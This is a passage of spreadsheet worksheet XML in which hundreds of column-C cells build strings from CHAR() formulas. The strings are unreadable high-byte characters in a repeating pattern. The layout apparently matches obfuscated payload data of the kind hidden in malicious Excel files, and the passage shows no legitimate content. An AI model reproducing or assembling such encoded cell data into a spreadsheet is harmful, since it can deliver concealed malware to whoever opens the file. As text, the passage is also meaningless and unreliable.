        <f>CHAR(251)&amp;CHAR(163)&amp;CHAR(62)&amp;CHAR(223)&amp;CHAR(214)&amp;CHAR(188)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(251)&amp;CHAR(160)</f>
        <v>û£&gt;ßÖ¼!Áû </v>
      </c>
    </row>
    <row r="921" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C921" t="str">
        <f>CHAR(62)&amp;CHAR(223)&amp;CHAR(214)&amp;CHAR(189)&amp;CHAR(33)&amp;CHAR(209)&amp;CHAR(251)&amp;CHAR(144)&amp;CHAR(62)&amp;CHAR(199)</f>
        <v>&gt;ßÖ½!Ñû&gt;Ç</v>
      </c>
    </row>
    <row r="922" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C922" t="str">
        <f>CHAR(214)&amp;CHAR(135)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(251)&amp;CHAR(183)&amp;CHAR(62)&amp;CHAR(194)&amp;CHAR(214)&amp;CHAR(166)</f>
        <v>Ö‡!óû·&gt;ÂÖ¦</v>
      </c>
    </row>
    <row r="923" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C923" t="str">
        <f>CHAR(33)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(139)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(141)</f>
        <v>!÷û‹&gt;±ÖÈ!</v>
      </c>
    </row>
    <row r="924" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C924" t="str">
        <f>CHAR(251)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(132)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(251)&amp;CHAR(168)</f>
        <v>ûÍ&gt;°Ö„!Àû¨</v>
      </c>
    </row>
    <row r="925" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C925" t="str">
        <f>CHAR(62)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(164)&amp;CHAR(33)&amp;CHAR(230)&amp;CHAR(251)&amp;CHAR(160)&amp;CHAR(62)&amp;CHAR(193)</f>
        <v>&gt;ÐÖ¤!æû &gt;Á</v>
      </c>
    </row>
    <row r="926" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C926" t="str">
        <f>CHAR(214)&amp;CHAR(177)&amp;CHAR(33)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(166)&amp;CHAR(62)&amp;CHAR(214)&amp;CHAR(214)&amp;CHAR(160)</f>
        <v>Ö±!×û¦&gt;ÖÖ </v>
      </c>
    </row>
    <row r="927" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C927" t="str">
        <f>CHAR(33)&amp;CHAR(209)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(145)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(137)</f>
        <v>!ÑûÏ&gt;‘ÖÈ!‰</v>
      </c>
    </row>
    <row r="928" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C928" t="str">
        <f>CHAR(251)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(132)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(251)&amp;CHAR(168)</f>
        <v>ûÍ&gt;°Ö„!Àû¨</v>
      </c>
    </row>
    <row r="929" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C929" t="str">
        <f>CHAR(62)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(164)&amp;CHAR(33)&amp;CHAR(241)&amp;CHAR(251)&amp;CHAR(189)&amp;CHAR(62)&amp;CHAR(208)</f>
        <v>&gt;ÐÖ¤!ñû½&gt;Ð</v>
      </c>
    </row>
    <row r="930" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C930" t="str">
        <f>CHAR(214)&amp;CHAR(172)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(251)&amp;CHAR(162)&amp;CHAR(62)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(186)</f>
        <v>Ö¬!Àû¢&gt;ÐÖº</v>
      </c>
    </row>
    <row r="931" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C931" t="str">
        <f>CHAR(33)&amp;CHAR(206)&amp;CHAR(251)&amp;CHAR(188)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(133)</f>
        <v>!Îû¼&gt;±ÖÈ!…</v>
      </c>
    </row>
    <row r="932" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C932" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(209)&amp;CHAR(214)&amp;CHAR(211)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(128)</f>
        <v>ûÏ&gt;ÑÖÓ!¤û€</v>
      </c>
    </row>
    <row r="933" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C933" t="str">
        <f>CHAR(62)&amp;CHAR(195)&amp;CHAR(214)&amp;CHAR(161)&amp;CHAR(33)&amp;CHAR(194)&amp;CHAR(251)&amp;CHAR(166)&amp;CHAR(62)&amp;CHAR(223)</f>
        <v>&gt;ÃÖ¡!Âû¦&gt;ß</v>
      </c>
    </row>
    <row r="934" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C934" t="str">
        <f>CHAR(214)&amp;CHAR(169)&amp;CHAR(33)&amp;CHAR(201)&amp;CHAR(251)&amp;CHAR(137)&amp;CHAR(62)&amp;CHAR(216)&amp;CHAR(214)&amp;CHAR(164)</f>
        <v>Ö©!Éû‰&gt;ØÖ¤</v>
      </c>
    </row>
    <row r="935" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C935" t="str">
        <f>CHAR(33)&amp;CHAR(192)&amp;CHAR(251)&amp;CHAR(161)&amp;CHAR(62)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(165)&amp;CHAR(33)&amp;CHAR(192)</f>
        <v>!Àû¡&gt;ÐÖ¥!À</v>
      </c>
    </row>
    <row r="936" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C936" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(238)&amp;CHAR(214)&amp;CHAR(173)&amp;CHAR(33)&amp;CHAR(221)&amp;CHAR(251)&amp;CHAR(172)</f>
        <v>ûÏ&gt;îÖ­!Ýû¬</v>
      </c>
    </row>
    <row r="937" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C937" t="str">
        <f>CHAR(62)&amp;CHAR(212)&amp;CHAR(214)&amp;CHAR(164)&amp;CHAR(33)&amp;CHAR(203)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(62)&amp;CHAR(213)</f>
        <v>&gt;ÔÖ¤!Ëû»&gt;Õ</v>
      </c>
    </row>
    <row r="938" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C938" t="str">
        <f>CHAR(214)&amp;CHAR(167)&amp;CHAR(33)&amp;CHAR(203)&amp;CHAR(251)&amp;CHAR(186)&amp;CHAR(62)&amp;CHAR(197)&amp;CHAR(214)&amp;CHAR(151)</f>
        <v>Ö§!Ëûº&gt;ÅÖ—</v>
      </c>
    </row>
    <row r="939" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C939" t="str">
        <f>CHAR(33)&amp;CHAR(211)&amp;CHAR(251)&amp;CHAR(128)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(214)&amp;CHAR(176)&amp;CHAR(33)&amp;CHAR(214)</f>
        <v>!Óû€&gt;çÖ°!Ö</v>
      </c>
    </row>
    <row r="940" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C940" t="str">
        <f>CHAR(251)&amp;CHAR(161)&amp;CHAR(62)&amp;CHAR(227)&amp;CHAR(214)&amp;CHAR(140)&amp;CHAR(33)&amp;CHAR(139)&amp;CHAR(251)&amp;CHAR(170)</f>
        <v>û¡&gt;ãÖŒ!‹ûª</v>
      </c>
    </row>
    <row r="941" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C941" t="str">
        <f>CHAR(62)&amp;CHAR(201)&amp;CHAR(214)&amp;CHAR(173)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(149)</f>
        <v>&gt;ÉÖ­!¥ûÏ&gt;•</v>
      </c>
    </row>
    <row r="942" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C942" t="str">
        <f>CHAR(214)&amp;CHAR(202)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(159)&amp;CHAR(62)&amp;CHAR(195)&amp;CHAR(214)&amp;CHAR(167)</f>
        <v>ÖÊ!¤ûŸ&gt;ÃÖ§</v>
      </c>
    </row>
    <row r="943" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C943" t="str">
        <f>CHAR(33)&amp;CHAR(193)&amp;CHAR(251)&amp;CHAR(186)&amp;CHAR(62)&amp;CHAR(210)&amp;CHAR(214)&amp;CHAR(188)&amp;CHAR(33)&amp;CHAR(235)</f>
        <v>!Áûº&gt;ÒÖ¼!ë</v>
      </c>
    </row>
    <row r="944" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C944" t="str">
        <f>CHAR(251)&amp;CHAR(174)&amp;CHAR(62)&amp;CHAR(220)&amp;CHAR(214)&amp;CHAR(173)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>û®&gt;ÜÖ­!¥ûÏ</v>
      </c>
    </row>
    <row r="945" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C945" t="str">
        <f>CHAR(62)&amp;CHAR(145)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(176)</f>
        <v>&gt;‘ÖÈ!ûÍ&gt;°</v>
      </c>
    </row>
    <row r="946" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C946" t="str">
        <f>CHAR(214)&amp;CHAR(152)&amp;CHAR(33)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(160)&amp;CHAR(62)&amp;CHAR(213)&amp;CHAR(214)&amp;CHAR(189)</f>
        <v>Ö˜!×û &gt;ÕÖ½</v>
      </c>
    </row>
    <row r="947" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C947" t="str">
        <f>CHAR(33)&amp;CHAR(198)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(214)&amp;CHAR(173)&amp;CHAR(33)&amp;CHAR(215)</f>
        <v>!Æû»&gt;çÖ­!×</v>
      </c>
    </row>
    <row r="948" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C948" t="str">
        <f>CHAR(251)&amp;CHAR(188)&amp;CHAR(62)&amp;CHAR(216)&amp;CHAR(214)&amp;CHAR(167)&amp;CHAR(33)&amp;CHAR(203)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>û¼&gt;ØÖ§!ËûÏ</v>
      </c>
    </row>
    <row r="949" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C949" t="str">
        <f>CHAR(62)&amp;CHAR(145)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;‘ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="950" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C950" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="951" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C951" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="952" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C952" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="953" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C953" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="954" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C954" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="955" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C955" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="956" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C956" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="957" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C957" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="958" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C958" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="959" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C959" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="960" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C960" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="961" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C961" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="962" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C962" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="963" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C963" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="964" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C964" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="965" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C965" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="966" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C966" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="967" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C967" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="968" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C968" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="969" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C969" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="970" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C970" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="971" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C971" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="972" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C972" t="str">
        <f>CHAR(203)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(189)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(117)&amp;CHAR(89)&amp;CHAR(207)</f>
        <v>ËÏ&gt;½ÖÈ!uYÏ</v>
      </c>
    </row>
    <row r="973" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C973" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="974" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C974" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="975" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C975" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="976" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C976" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="977" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C977" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="978" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C978" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="979" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C979" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="980" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C980" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="981" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C981" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="982" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C982" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="983" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C983" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="984" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C984" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="985" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C985" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="986" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C986" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="987" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C987" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="988" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C988" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="989" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C989" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="990" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C990" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="991" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C991" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="992" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C992" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="993" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C993" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="994" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C994" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="995" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C995" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
